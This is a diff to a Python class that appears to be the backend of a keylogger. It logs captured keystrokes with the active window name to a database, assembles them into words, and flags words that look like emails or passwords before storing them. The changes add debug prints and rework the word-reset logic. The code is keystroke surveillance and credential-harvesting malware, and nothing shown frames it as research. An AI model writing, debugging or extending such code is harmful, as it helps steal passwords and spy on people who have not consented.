@@ -22,6 +22,7 @@ class Process:
     #######################################
     
     def addKey(self, data):
+        print(data)
         payload = json.loads(data)
         self.pushDB_keys(payload)
         self.appendWord(payload)
@@ -41,7 +42,7 @@ class Process:
         val = (f"{payload['datetime']}", f"{payload['epochTime']}", f"{payload['isKeyDown']}", f"{payload['windowName']}", f"{payload['asciiCode']}", f"{payload['asciiChar']}", f"{payload['keyName']}", f"{payload['isCaps']}", f"{payload['processedKey']}")
   
         mycursor.execute(sql, val)
-  
+        print(sql,val) 
         db.commit()
         mycursor.close()
         db.close()
@@ -59,16 +60,19 @@ class Process:
     - Also check that if the first key we recieve is a Space or return, that this is not pushed to database
     '''
     def appendWord(self,data):
-        if (data['processedKey'] != ""):
+        if (data['processedKey']):
             if (len(self.word) == 0):
+                print("setting word payload WITH " + data['keyName'])
                 self.payload['datetime'] = data['datetime']
                 self.payload['epoch'] = data['epochTime']
                 self.payload['windowName'] = data['windowName']
             self.word += data['processedKey']
-        elif (data['keyName'] == "Space" or data['keyName'] == "Return" and self.payload['datetime'] != ""):
+        elif (self.payload['datetime'] != ""):
             #TODO: if last word, add the time pressed as end time
+            print("HERE")
             self.payload['processedWord'] = self.word
-            self.resetWord()
+            print(self.payload)
+            #self.resetWord()
             self.checkEmailPassword()
             self.pushDB_word()
             
@@ -106,6 +110,7 @@ class Process:
         sql = f"INSERT INTO {self.cfg['dbWordTable']} {self.cfg['dbWordRows']} VALUES (%s, %s, %s, %s, %s, %s)"
         val = (f"{self.payload['datetime']}", f"{self.payload['epoch']}", f"{self.payload['windowName']}", f"{self.payload['processedWord']}",f"{self.payload['isEmail']}", f"{self.payload['isPassword']}")
         
+        print(sql,val)
         mycursor.execute(sql, val)
         self.payload['processedWord'] = ""
         
@@ -113,6 +118,7 @@ class Process:
         mycursor.close()
         db.close()
         
+        self.resetWord() #clear word and payload for next incoming word processing
         return 0 
         
     def resetWord(self):
